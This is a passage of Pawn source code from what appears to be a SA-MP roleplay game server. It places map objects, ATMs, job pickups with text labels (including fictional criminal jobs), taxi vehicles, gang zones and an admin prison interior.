	CreateDynamicObject(2412,486.75384500,-2378.35742200,9.80765400,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(14439,475.54144300,-2385.82763700,18.92340100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(14439,475.54144300,-2401.75097700,18.92340100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(14439,475.54144300,-2418.64746100,18.92340100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(14439,475.54144300,-2435.27002000,18.92340100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(2583,480.82501200,-2446.36889600,10.59204000,0.00000000,0.00000000,180.48182006, .interiorid = 18);
	CreateDynamicObject(7493,488.62420700,-2424.43994100,23.43117500,0.00000000,-180.48210654,180.48182006, .interiorid = 18);
	CreateDynamicObject(994,480.97076400,-2384.01464800,9.89794700,0.00000000,0.00000000,88.52197935, .interiorid = 18);
	CreateDynamicObject(1889,459.35699500,-2393.92797900,9.79353900,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1889,463.85675000,-2393.95288100,9.79353900,0.00000000,0.00000000,0.00000000, .interiorid = 18);

	// ATMs
	CreateDynamicObject(2942, 2065.439453125, -1897.5510253906, 13.19670009613, 0, 0, 0);
   	CreateDynamicObject(2942, 1497.7467041016, -1749.8747558594, 15.088212013245, 0, 0, 177.38134765625);
	CreateDynamicObject(2942, 2093.5124511719, -1359.5474853516, 23.62727355957, 0, 0, 0);
	CreateDynamicObject(2942, 1155.6235351563, -1464.9141845703, 15.44321346283, 0, 0, 290.21020507813);
	CreateDynamicObject(2942, 2139.4487304688, -1164.0811767578, 23.63508605957, 0, 0, 91.309509277344);
	CreateDynamicObject(2942, 387.16552734375, -1816.0512695313, 7.4834146499634, 0, 0, 272.48046875);
	CreateDynamicObject(2942, -24.385023117065, -92.001075744629, 1003.1897583008, 0, 0, 180.54052734375);
	CreateDynamicObject(2942, -31.811220169067, -58.106018066406, 1003.1897583008, 0, 0, 181.21594238281);
	CreateDynamicObject(2942, 1212.7785644531, 2.451762676239, 1000.5647583008, 0, 0, 0);
	CreateDynamicObject(2942, 2324.4028320313, -1644.9445800781, 14.469946861267, 0, 0, 0);
	CreateDynamicObject(2942, 2228.39, -1707.78, 13.25, 0.000000, 0.000000, 270.000000); // Ganton Gym ATM
	CreateDynamicObject(2942, 651.19305419922, -520.48815917969, 15.978837013245, 0, 0, 0);
	CreateDynamicObject(2942, 45.78035736084, -291.80926513672, 1.5024013519287, 0, 0, 182.93444824219);
	CreateDynamicObject(2942, 1275.7958984375, 368.31481933594, 19.19758605957, 0, 0, 73.759948730469);
	CreateDynamicObject(2942, 2303.4577636719, -13.539554595947, 26.12727355957, 0, 0, 272.43542480469);
	CreateDynamicObject(2942, 691.08215332031, -618.5625, 15.978837013245, 0, 0, 268.69067382813);
	CreateDynamicObject(2942, 173.23471069336, -155.07606506348, 1.2210245132446, 0, 0, 89.730041503906);
	CreateDynamicObject(2942, 1260.8796386719, 209.30152893066, 19.19758605957, 0, 0, 65.504638671875);
	CreateDynamicObject(2942, 2316.1015625, -88.522567749023, 26.12727355957, 0, 0, 0);
	CreateDynamicObject(1318, 1798.08, -1578.68, 14.09, 0, 0, 0);


	// Job Pickups
	CreatePickup(1239, 23, 256.971954, 69.655586, 1003.640625, -1); // Detective job (LS)
	CreatePickup(1239, 23, 1215.1304,-11.8431,1000.9219, -1); //Whore Registration (LS)
 	CreatePickup(1239, 23, -1720.07, 1356.23, 6.75, -1); // Pizza Boy job (LS)
 	CreatePickup(1239, 23, 2166.3772, -1675.3829, 15.0859, -1); // Drug Dealer job
 	CreatePickup(1239, 23, 2354.2808,-1169.2959,28.0066, -1); //Drug Smuggler (LS)
 	CreatePickup(1239, 23, 1380.8955,-1088.6808,27.3844, -1); //Lawyer Registration
 	CreatePickup(1239, 23, 2226.1716,-1718.1792,13.5165, -1); //BodyGuard Registration (LS)
 	CreatePickup(1239, 23, 1099.73,-1504.67,15.800, -1); //Bodyguard (All Saints Mall) Registration
 	CreatePickup(1239, 23, 1366.4325,-1275.2096,13.5469, -1); //ArmsDealer Registration (LS)
	CreatePickup(1239, 23, 766.0804,14.5133,1000.7004, -1); //Boxer Registration (LS)
	CreatePickup(1239, 23, 758.98,-60.32,1000.78, -1); //Boxer Registration2 (LS)
	CreatePickup(1239, 23, 1741.6218,-1863.6486,13.5748, -1); //TaxiDriver Registration (LS)
    CreatePickup(1239, 23, 502.6696,-11.6603,1000.6797, -1); //Bartender Registration
    CreatePickup(1239, 23, 2195.8335,-1973.0638,13.5589, -1); //Craftsman Registration
	CreatePickup(1239, 23, 216.44, 18.47, 2.14, -1); //Car Mechanic Registration
 	CreatePickup(1239, 23, -1549.33, 112.50, 3.12, -1); //Trucker registration

 	// Other job pickups
	CreatePickup(1239, 23, -1726.92, 1359.93, 7.19, -1); // Pizza /getpizza

	// Job 3D text labels
	CreateDynamic3DTextLabel("Detective Job \nType /join to become one",COLOR_YELLOW,256.971954, 69.655586, 1003.640625+0.5,4.0);// Detective Job (LS)
	CreateDynamic3DTextLabel("Whore Job \nType /join to become one",COLOR_YELLOW,1215.1304,-11.8431,1000.9219+0.5,4.0);// Whore (LS)
	CreateDynamic3DTextLabel("Pizza Boy Job \nType /join to become one",COLOR_YELLOW,-1720.07,1356.23,6.75+0.5,4.0);// Pizza Boy Job (LS)
	CreateDynamic3DTextLabel("Drug Dealer Job \nType /join to become one",COLOR_YELLOW,2166.3772,-1675.3829,15.0859+0.5,4.0);// Drug Dealer (LS)
	CreateDynamic3DTextLabel("Drug Smuggler Job \nType /join to become one",COLOR_YELLOW,2354.2808,-1169.2959,28.0066+0.5,4.0);// Drug Smuggler (LS)
    CreateDynamic3DTextLabel("Lawyer Job \nType /join to become one",COLOR_YELLOW,1380.8955,-1088.6808,27.3844+0.5,4.0);// Lawyer (LS)
    CreateDynamic3DTextLabel("Bodyguard Job \nType /join to become one",COLOR_YELLOW,2226.1716,-1718.1792,13.5165+0.5,4.0);// Bodyguard (LS)
    CreateDynamic3DTextLabel("Bodyguard Job \nType /join to become one",COLOR_YELLOW,1099.73,-1504.67,15.800+0.5,4.0);// Bodyguard (All Saints Mall)
    CreateDynamic3DTextLabel("Arms Dealer Job \nType /join to become one",COLOR_YELLOW,1366.4325,-1275.2096,13.5469+0.5,4.0);// Gun Job (LS)
    CreateDynamic3DTextLabel("Boxer Job \nType /join to become one",COLOR_YELLOW,766.0804,14.5133,1000.7004+0.5,4.0);// Boxer
    CreateDynamic3DTextLabel("Boxer Job \nType /join to become one",COLOR_YELLOW,758.98,-60.32,1000.78+0.5,4.0);// Boxer2
    CreateDynamic3DTextLabel("Taxi Job \nType /join to become one",COLOR_YELLOW,1741.6218,-1863.6486,13.5748+0.5,4.0);// Taxi Driver (LS)
    CreateDynamic3DTextLabel("Bartender Job \nType /join to become one",COLOR_YELLOW,502.6696,-11.6603,1000.6797+0.5,4.0);// Bartender (Alhambra)
    CreateDynamic3DTextLabel("Craftsman Job \nType /join to become one",COLOR_YELLOW,2195.8335,-1973.0638,13.5589+0.5,4.0);// Craftsman (JUNKYARD LS)
    CreateDynamic3DTextLabel("Mechanic Job \nType /join to become one",COLOR_YELLOW,216.44,18.47,2.14+0.5,4.0);// Mechanic (LS)
	CreateDynamic3DTextLabel("Trucker Job \nType /join to become one",COLOR_YELLOW,-1549.33,112.50,3.12+0.5,4.0);// Trucker Job (LS)
	CreateDynamic3DTextLabel("VIP Lounge",COLOR_YELLOW,1798.08,-1578.68,14.09+0.5,4.0);// Trucker Job (LS)

	// Other job 3D text labels
	CreateDynamic3DTextLabel("Type /getpizza from a Pizzaboy \nto get pizzas for delivery!",COLOR_YELLOW,-1726.92, 1359.93, 7.19, 4.0); //getpizza
	CreateDynamic3DTextLabel("Use /train\nto get a new fighting style",COLOR_YELLOW,758.43,-78.0,1000.65+0.5,4.0);
	CreateDynamic3DTextLabel("Use /train\nto get a new fighting style",COLOR_YELLOW,756.229125, 5.614504, 1000.698608+0.5,4.0);

	// General 3D text labels
 	CreateDynamic3DTextLabel("/buyclothes\n To change your skin.",COLOR_YELLOW,208.8970,-100.3289,1005.2578,8.0);
    CreateDynamic3DTextLabel("/buyclothes\n To change your skin.",COLOR_YELLOW,206.5429,-41.2313,1001.8047,8.0);
    CreateDynamic3DTextLabel("/buyclothes\n To change your skin.",COLOR_YELLOW,209.3064,-8.3033,1005.2109,8.0);
    CreateDynamic3DTextLabel("/buyclothes\n To change your skin.",COLOR_YELLOW,159.6771,-83.2866,1001.8120,8.0);
    CreateDynamic3DTextLabel("/buyclothes\n To change your skin.",COLOR_YELLOW,206.4552,-163.0903,1000.5234,8.0);
    CreateDynamic3DTextLabel("/buytoys\n To buy some accessories.",COLOR_YELLOW,206.3253,-100.3268,1005.2578,8.0);
    CreateDynamic3DTextLabel("/buytoys\n To buy some accessories.",COLOR_YELLOW,201.0413,-40.1616,1001.8047,8.0);
    CreateDynamic3DTextLabel("/buytoys\n To buy some accessories.",COLOR_YELLOW,206.3963,-8.2122,1001.2109,8.0);
    CreateDynamic3DTextLabel("/buytoys\n To buy some accessories.",COLOR_YELLOW,162.7706,-83.2726,1001.8047,8.0);
    CreateDynamic3DTextLabel("/buytoys\n To buy some accessories.",COLOR_YELLOW,202.6777,-163.0623,1000.5306,8.0);

	// DMV
 	CreateDynamic3DTextLabel("To pay your tickets or\nrelease your cars, type /dmvmenu",COLOR_YELLOW,833.60, 3.23, 1004.17+0.6,4.0);//

 	//getlicense
 	CreateDynamic3DTextLabel("Type /getlicense to \nacquire a license.",COLOR_YELLOW,-1209.552001, -171.159011, 4891.833007+0.5,8.0);// Licenses.
    CreatePickup(1239, 23, -1209.552001, -171.159011, 4891.833007, -1);

    // The Lubu Gentlemen's Club (pickup + text label)
    CreateDynamic3DTextLabel("The Lubu Gentlemen's Club",COLOR_YELLOW,511.817230, -1510.971679, 14.566996+0.7,10.0);
    CreatePickup(1318, 23, 511.817230, -1510.971679, 14.566996, -1);
    // The Tableau Club (pickup + text label)
    CreateDynamic3DTextLabel("VIP Lounge",COLOR_YELLOW,561.802795, -1506.722412, 14.548986+0.7,10.0);
    CreatePickup(1318, 23, 561.802795, -1506.722412, 14.548986, -1);
    CreateDynamic3DTextLabel("VIP Room\nEntrance cost: $100",COLOR_YELLOW,307.904296, 1025.602294, 1098.540039+0.7,10.0);
    CreatePickup(1318, 23, 307.904296, 1025.602294, 1098.540039, -1);
    // Santa Maria Surfer's Lounge
    CreateDynamic3DTextLabel("Santa Maria Surfer's Lounge",COLOR_YELLOW,387.958374, -1870.688110, 7.835937+0.7,10.0);
    CreatePickup(1318, 23, 387.958374, -1870.688110, 7.835937, -1);

    // Parachute at Startower
    CreateDynamic3DTextLabel("/getparachute",COLOR_YELLOW,1544.2,-1353.4,329.4+0.6,10.0);
   	CreatePickup(371, 23, 1544.2,-1353.4,329.4); //LS towertop
	CreatePickup(371, 23, 1536.0, -1360.0, 1150.0); //LS towertop

	// Changename
	CreateDynamic3DTextLabel("Name Change Point \nType /changename to change your name",COLOR_YELLOW,1154.7295,-1440.2323,15.7969+0.6,18.0); // Namechange at mall
	CreatePickup(1239, 23, 1154.7295,-1440.2323,15.7969); //Changename

	// Los Santos Vehicles

	// Taxi vehicles
	AddStaticVehicleEx(420,1775.6141,-1860.0100,13.2745,269.2006,6,6, VEHICLE_RESPAWN);
	AddStaticVehicleEx(420,1763.0121,-1860.0037,13.2723,271.2998,6,6, VEHICLE_RESPAWN);
	AddStaticVehicleEx(420,1748.9358,-1859.9502,13.2721,270.3943,6,6, VEHICLE_RESPAWN);
	AddStaticVehicleEx(420,1734.6754,-1859.9305,13.2740,270.5646,6,6, VEHICLE_RESPAWN);
	AddStaticVehicleEx(438,1807.70861816,-1866.13635254,13.78153229,0.00000000,6,6,VEHICLE_RESPAWN); //Cabbie
	AddStaticVehicleEx(438,1802.05126953,-1866.05419922,13.78153229,0.00000000,6,6,VEHICLE_RESPAWN); //Cabbie
	AddStaticVehicleEx(438,1797.65332031,-1866.18798828,13.78153229,0.00000000,6,6,VEHICLE_RESPAWN); //Cabbie
	AddStaticVehicleEx(438,1792.40527344,-1866.47851562,13.78153229,0.00000000,6,6,VEHICLE_RESPAWN); //Cabbie

	// Pount boundaries with gang zones
	pointboundaries[0] = GangZoneCreate(2545.8984375 ,-2153.3203125, 2707.03125, -2062.5); // FFC
	pointboundaries[1] = GangZoneCreate(1361.328125,-1435.546875,1478.515625,-1236.328125); // MP1
	pointboundaries[2] = GangZoneCreate(2077.1484375, -2361.328125, 2285.15625, -2179.6875); // MF1
	pointboundaries[3] = GangZoneCreate(2298.828125,-2064.453125,2546.875,-1935.546875); // MP2
	pointboundaries[4] = GangZoneCreate(2156.25, -1151.3671875, 2320.3125, -1001.953125); // MF2
	pointboundaries[5] = GangZoneCreate(2581.0546875, -2586.9140625, 2862.3046875, -2329.1015625); // AEC
	pointboundaries[6] = GangZoneCreate(2105.46875,-1753.90625,2177.734375,-1626.953125); // Drug House
	pointboundaries[7] = GangZoneCreate(2304.6875,-1181.640625,2361.328125,-1160.15625); // Crack Lab
	pointboundaries[8] = GangZoneCreate(13.671875,-402.34375,167.96875,-208.984375); // Drug Factory

	// Crack Lab Fixes
	CreateDynamicObject(7191,2338.39135742,-1182.56323242,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(1)
	CreateDynamicObject(13656,2292.93872070,-1132.04724121,1017.29772949,0.00000000,0.00000000,0.00000000, -1, 5); //object(fuckknows)(1)
	CreateDynamicObject(7191,2337.95458984,-1182.54309082,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(2)
	CreateDynamicObject(7191,2338.43408203,-1182.39440918,1032.95129395,90.00000000,180.00000000,90.24850464, -1, 5); //object(vegasnnewfence2b)(3)
	CreateDynamicObject(7191,2337.97314453,-1182.39111328,1032.95129395,90.00000000,179.99450684,90.24719238, -1, 5); //object(vegasnnewfence2b)(4)
	CreateDynamicObject(7191,2328.80346680,-1180.43066406,1034.70544434,0.00000000,270.00000000,88.50006104, -1, 5); //object(vegasnnewfence2b)(5)
	CreateDynamicObject(3055,2319.78198242,-1184.82641602,1032.36450195,63.75003052,269.99996948,178.5001220, -1, 5); //object(kmb_shutter)(1)
	CreateDynamicObject(7191,2328.83715820,-1186.81262207,1030.70446777,0.00000000,90.74990845,359.99481201, -1, 5); //object(vegasnnewfence2b)(6)
	CreateDynamicObject(7191,2326.84863281,-1187.03125000,1030.70446777,0.00000000,90.74707031,359.99450684, -1, 5); //object(vegasnnewfence2b)(8)
	CreateDynamicObject(7191,2337.31689453,-1186.55639648,1030.70446777,0.00000000,90.74707031,359.99450684, -1, 5); //object(vegasnnewfence2b)(9)
	CreateDynamicObject(7191,2339.06689453,-1186.13159180,1030.70446777,0.00000000,91.24694824,359.99453735, -1, 5); //object(vegasnnewfence2b)(10)
	CreateDynamicObject(7191,2338.39062500,-1182.56250000,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(11)
	CreateDynamicObject(7191,2337.95947266,-1179.38879395,1032.95129395,90.00000000,180.00000000,270.00000000, -1, 5); //object(vegasnnewfence2b)(12)
	CreateDynamicObject(7191,2338.38476562,-1179.43066406,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(13)
	CreateDynamicObject(7191,2337.96630859,-1179.23559570,1032.95129395,90.00000000,179.99450684,90.24719238, -1, 5); //object(vegasnnewfence2b)(14)

	// Gas station fix
	CreateDynamicObject(970,1942.49000000,-1766.66000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1942.49000000,-1770.81000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1942.49000000,-1774.95000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1942.49000000,-1779.11000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1940.77000000,-1766.66000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1940.77000000,-1770.81000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1940.77000000,-1774.95000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1940.77000000,-1779.11000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(19121,1941.63000000,-1781.03000000,13.16000000,0.00000000,0.00000000,0.00000000);
	CreateDynamicObject(19121,1941.64000000,-1764.87000000,13.16000000,0.00000000,0.00000000,0.00000000);

	// Points
	CreateDynamicObject(970, 2294.1489257813, -1119.072265625, 37.5280418396, 0.000000, 0.000000, 89.559997558594);
	CreateDynamicObject(970, 2294.1589355469, -1114.8975830078, 37.5280418396, 0.000000, 0.000000, 90.0576171875);
	CreateDynamicObject(970, 2294.1552734375, -1110.7277832031, 37.5280418396, 0.000000, 0.000000, 90.054931640625);
	CreateDynamicObject(970, 2294.1496582031, -1106.5516357422, 37.5280418396, 0.000000, 0.000000, 90.054931640625);
	CreateDynamicObject(970, 2293.8994140625, -1102.4005126953, 37.5280418396, 0.000000, 0.000000, 96.804931640625);
	CreateDynamicObject(944, 2290.7561035156, -1103.4783935547, 37.861351013184, 0.000000, 0.000000, 171);
	CreateDynamicObject(3265, 2268.6408691406, -1135.2796630859, 27.531494140625, 0.000000, 0.000000, 346);
	CreateDynamicObject(944, 2386.1618652344, -2008.1566162109, 13.43848991394, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1635, 2396.1938476563, -2008.0467529297, 16.3014087677, 0.000000, 0.000000, 90);
	CreateDynamicObject(1522, 2389.7197265625, -2007.4593505859, 12.553703308105, 0.000000, 0.000000, 0.000000);

	// FIX - Stability Glitch for the Welcome
	CreateDynamicObject(4729, 682.85186767578, -446.04205322266, -26.629999160767, 20, 90, 0.000000, -1, 1, -1, 200.0);

	// Admin prison
	CreateDynamicObject(5706,201.06250000,1798.30761719,1605.14282227,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(studiobld03_law) (1)
	CreateDynamicObject(5706,200.97360229,1800.69091797,1624.89306641,0.00000000,180.00000000,180.00000000, .interiorid = 69); //object(studiobld03_law) (2)
	CreateDynamicObject(5706,201.04508972,1785.34130859,1616.89306641,90.00000000,180.00000000,0.00000000, .interiorid = 69); //object(studiobld03_law) (3)
	CreateDynamicObject(5706,187.49099731,1798.58190918,1616.89306641,270.00000000,167.22003174,77.22552490, .interiorid = 69); //object(studiobld03_law) (5)
	CreateDynamicObject(5706,221.26737976,1796.82397461,1616.89306641,270.00000000,0.00000000,90.00000000, .interiorid = 69); //object(studiobld03_law) (6)
	CreateDynamicObject(10974,185.34759521,1795.66455078,1623.84826660,180.00000000,0.00000000,0.00000000, .interiorid = 69); //object(mall_01_sfs) (1)
	CreateDynamicObject(14856,216.09912109,1811.63830566,1610.83496094,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(cellsa) (1)
	CreateDynamicObject(3095,213.05435181,1806.09997559,1612.68823242,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (2)
	CreateDynamicObject(3095,204.07275391,1806.09997559,1612.68823242,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (3)
	CreateDynamicObject(3095,195.12341309,1806.09997559,1612.68823242,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (4)
	CreateDynamicObject(3095,213.12713623,1806.10498047,1613.26379395,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (6)
	CreateDynamicObject(3095,204.15332031,1806.10498047,1613.26379395,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (7)
	CreateDynamicObject(3095,195.16894531,1806.10498047,1613.26379395,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (8)
	CreateDynamicObject(3095,213.20382690,1807.67150879,1608.71374512,90.00000000,180.00549316,269.98904419, .interiorid = 69); //object(a51_jetdoor) (10)
	CreateDynamicObject(3095,213.95382690,1807.67102051,1608.71374512,270.00000000,179.99963379,269.98315430, .interiorid = 69); //object(a51_jetdoor) (11)
	CreateDynamicObject(3095,208.95237732,1807.66687012,1608.71374512,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (12)
	CreateDynamicObject(3095,209.71374512,1807.66662598,1608.71374512,270.00000000,180.00041199,269.98388672, .interiorid = 69); //object(a51_jetdoor) (13)
	CreateDynamicObject(3095,205.46282959,1807.69738770,1608.71374512,270.00000000,180.00152588,269.98498535, .interiorid = 69); //object(a51_jetdoor) (15)
	CreateDynamicObject(3095,204.15332031,1807.69628906,1608.98876953,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (16)
	CreateDynamicObject(3095,213.12890625,1807.69628906,1608.98779297,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (17)
	CreateDynamicObject(3095,204.16938782,1809.18554688,1613.41516113,90.00000000,180.00549316,0.00000000, .interiorid = 69); //object(a51_jetdoor) (18)
	CreateDynamicObject(3095,213.16665649,1809.18652344,1613.41442871,90.00000000,180.00549316,0.00000000, .interiorid = 69); //object(a51_jetdoor) (19)
	CreateDynamicObject(1508,217.57765198,1795.53601074,1610.62158203,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(dyn_garage_door) (1)
	CreateDynamicObject(3095,213.95312500,1807.67089844,1617.71423340,270.00000000,179.99450684,269.97802734, .interiorid = 69); //object(a51_jetdoor) (22)
	CreateDynamicObject(3095,213.20312500,1807.67089844,1617.66418457,90.00000000,180.00549316,269.98901367, .interiorid = 69); //object(a51_jetdoor) (23)
	CreateDynamicObject(3095,209.71289062,1807.66601562,1617.38842773,270.00000000,179.99450684,269.97802734, .interiorid = 69); //object(a51_jetdoor) (24)
	CreateDynamicObject(3095,208.95214844,1807.66601562,1617.19018555,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (25)
	CreateDynamicObject(3095,205.46191406,1807.67187500,1617.19042969,270.00000000,179.99853516,269.98202515, .interiorid = 69); //object(a51_jetdoor) (26)
	CreateDynamicObject(3095,204.82421875,1807.67285156,1617.76354980,90.00000000,180.00549316,269.98904419, .interiorid = 69); //object(a51_jetdoor) (27)
	CreateDynamicObject(14856,216.09863281,1811.63769531,1615.11096191,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(cellsa) (2)
	CreateDynamicObject(3095,213.12890625,1806.10498047,1617.53784180,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (28)
	CreateDynamicObject(3095,213.05371094,1806.11840820,1616.96350098,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (29)
	CreateDynamicObject(3095,204.17089844,1806.10498047,1616.96374512,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (30)
	CreateDynamicObject(3095,204.14634705,1806.12365723,1617.53930664,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (31)
	CreateDynamicObject(14856,216.09863281,1811.63769531,1619.23608398,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(cellsa) (3)
	CreateDynamicObject(3095,204.16894531,1809.18554688,1622.41491699,90.00000000,179.99450684,0.00549316, .interiorid = 69); //object(a51_jetdoor) (32)
	CreateDynamicObject(3095,213.16601562,1809.18652344,1622.41271973,90.00000000,180.00549316,0.00000000, .interiorid = 69); //object(a51_jetdoor) (33)
	CreateDynamicObject(3095,217.44302368,1806.10583496,1621.96374512,90.00000000,180.00549316,269.98904419, .interiorid = 69); //object(a51_jetdoor) (34)
	CreateDynamicObject(1508,191.36837769,1795.14965820,1610.62158203,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(dyn_garage_door) (2)
	CreateDynamicObject(3095,204.14608765,1806.11840820,1621.06384277,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (35)
	CreateDynamicObject(3095,213.05371094,1806.09960938,1621.06481934,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (36)
	CreateDynamicObject(3095,195.18051147,1807.69628906,1608.98876953,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (37)
	CreateDynamicObject(3095,195.21980286,1809.17871094,1613.41516113,90.00000000,179.99450684,0.01098633, .interiorid = 69); //object(a51_jetdoor) (38)
	CreateDynamicObject(3095,195.21972656,1809.17871094,1622.41491699,90.00000000,179.99450684,0.00549316, .interiorid = 69); //object(a51_jetdoor) (39)
	CreateDynamicObject(3095,199.09042358,1807.69812012,1617.76354980,90.00000000,180.00549316,269.98901367, .interiorid = 69); //object(a51_jetdoor) (40)
	CreateDynamicObject(3095,199.87951660,1807.70117188,1617.19042969,270.00000000,179.99450684,269.98352051, .interiorid = 69); //object(a51_jetdoor) (41)
	CreateDynamicObject(970,211.04483032,1801.64660645,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (1)
	CreateDynamicObject(970,215.34765625,1801.64648438,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (2)
	CreateDynamicObject(970,206.81762695,1801.64660645,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (3)
	CreateDynamicObject(970,202.59719849,1801.64660645,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (4)
	CreateDynamicObject(970,202.59667969,1801.64648438,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (5)
	CreateDynamicObject(970,206.81738281,1801.64648438,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (6)
	CreateDynamicObject(970,211.04394531,1801.64648438,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (7)
	CreateDynamicObject(970,215.34765625,1801.64648438,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (8)
	CreateDynamicObject(970,198.36755371,1801.64660645,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (9)
	CreateDynamicObject(14856,192.71429443,1811.66918945,1610.82006836,0.00000000,0.00000000,180.00000000, .interiorid = 69); //object(cellsa) (4)
	CreateDynamicObject(14856,192.71386719,1811.66894531,1615.09558105,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(cellsa) (5)
	CreateDynamicObject(14856,192.71386719,1811.66894531,1619.24499512,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(cellsa) (6)
	CreateDynamicObject(3095,203.34902954,1807.69787598,1608.71374512,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (47)
	CreateDynamicObject(3095,203.34912109,1807.70043945,1616.81311035,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (49)
	CreateDynamicObject(3095,199.85475159,1807.69226074,1608.44140625,270.00000000,179.99450684,269.97802734, .interiorid = 69); //object(a51_jetdoor) (52)
	CreateDynamicObject(3095,199.11541748,1807.69702148,1608.26379395,90.00000000,180.00549316,269.98901367, .interiorid = 69); //object(a51_jetdoor) (53)
	CreateDynamicObject(3095,194.85942078,1807.69738770,1617.76354980,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (54)
	CreateDynamicObject(3095,195.61764526,1807.69738770,1617.19042969,270.00000000,180.00036621,269.98388672, .interiorid = 69); //object(a51_jetdoor) (55)
	CreateDynamicObject(3095,195.61718750,1807.69726562,1608.51403809,270.00000000,179.99853516,269.98202515, .interiorid = 69); //object(a51_jetdoor) (56)
	CreateDynamicObject(3095,194.85937500,1807.69726562,1608.28735352,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (57)
	CreateDynamicObject(3095,195.14624023,1806.11840820,1621.06384277,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (58)
	CreateDynamicObject(3095,195.18821716,1806.10400391,1616.96374512,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (59)
	CreateDynamicObject(3095,195.15039062,1806.10498047,1617.53930664,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (60)
	CreateDynamicObject(3095,191.34226990,1806.09716797,1617.19042969,270.00000000,179.99853516,269.98205566, .interiorid = 69); //object(a51_jetdoor) (61)
	CreateDynamicObject(3095,191.34179688,1806.09667969,1608.31457520,270.00000000,179.99450684,269.97802734, .interiorid = 69); //object(a51_jetdoor) (62)
	CreateDynamicObject(3095,217.42178345,1806.11962891,1613.11291504,90.00000000,180.00549316,270.00000000, .interiorid = 69); //object(a51_jetdoor) (63)
	CreateDynamicObject(3095,188.47315979,1797.14782715,1613.26379395,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (64)
	CreateDynamicObject(3095,188.47315979,1788.17077637,1613.26379395,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (65)
	CreateDynamicObject(3095,188.47265625,1797.14746094,1617.53979492,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (66)
	CreateDynamicObject(3095,188.47265625,1788.16992188,1617.53881836,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (67)
	CreateDynamicObject(3095,188.48295593,1797.18103027,1612.68823242,0.00000000,0.00000000,180.00000000, .interiorid = 69); //object(a51_jetdoor) (68)
